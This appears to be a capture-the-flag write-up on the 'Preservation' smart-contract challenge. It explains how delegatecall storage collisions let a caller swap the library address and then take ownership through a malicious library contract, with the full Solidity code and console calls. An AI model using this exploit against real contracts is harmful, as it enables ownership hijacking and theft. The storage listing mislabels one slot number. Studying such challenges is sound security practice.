# Preservation

## Delegatecall
> delegatecall is a low level function similar to call.

> When contract A executes delegatecall to contract B, B's code is excuted with contract A's storage, msg.sender and msg.value.

```solidity
// public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

Let's look at the delegatecall methods : 

```solidity
// set the time for timezone 1
function setFirstTime(uint _timeStamp) public {
  timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}
```

When contract A(Preservation) executes delegatecall to B(LibraryContract), B(LibraryContract)'s code(setTimeSignature(_timeStamp)) is excuted with A(Preservation)'s storage(timeZone1Library, timeZone2Library, owner, storedTime), msg.sender(myContract) and msg.value(0).

So *setTime(uint _time)* is being called with *_timestamp*, *Preservation*'s storage, msg.sender and msg.value. How can I abuse this? Is there a way to inject a malicious contract through *_timestamp*?

Fast forward an hour of no progress I gave up and looked at a hint :'c.

> If Contract A makes a delegatecall to Contract B, it allows Contract B to freely mutate its storage A, given Contract B’s relative storage reference pointers.

Looking at *Preservation*'s storage using web3.eth.getStorageAt(contract.address, 0): 

> slot 0 = 0x0000000000000000000000007dc17e761933d24f4917ef373f6433d4a62fe3c5= 20/32 bytes (timeZone1Library)

> slot 1 = 0x000000000000000000000000ea0de41efafa05e2a54d1cd3ec8ce154b1bb78f1= 20/32 bytes (timeZone2Library) 

> slot 2 = 0x00000000000000000000000097e982a15fbb1c28f6b8ee971bec15c78b3d263f = 20/32 bytes (owner)

> slot 2 = 0x0 = 0/32 bytes (storedTime)

If we can manipulate *LibraryContract*'s storedTime, it will mutate *Preservation*'s *timeZone1Library* variable, because *storedTime* is a pointer to slot 0 in *Preservation*. 

I had a misconception that *storedTime* in *LibraryContract* pointed to *storedTime* in *Preservation*, so in this case the code doesnt really work in the first place.

Trying out : 

> contract.setFirstTime(1)

Will set slot 0 to 0x1, which is correct after checking. All we have to do now is to create a malicious contract that has a malicious *setTime(uint _time)* method that lets us change the owner to ourself.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract hackedLibraryContract {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  function setTime(uint _time) public {
    owner = 0x36b19c3573beE32B810076d195FC15baFC72a562;
  }
}
```
See how we initialized the variables the same way as in *Preservation*, so *owner* will change slot 2 in *Preservation* unlike before where it changed slot 0, plain and simple. After calling :

> await contract.setFirstTime('0xA221A4D5c563295F536EeE6e32082EA5C43fEba0')

which is the address of my deployed contract, just calling :

> await contract.setFirstTime(1)

will trigger our malicious contract, and make us the owner
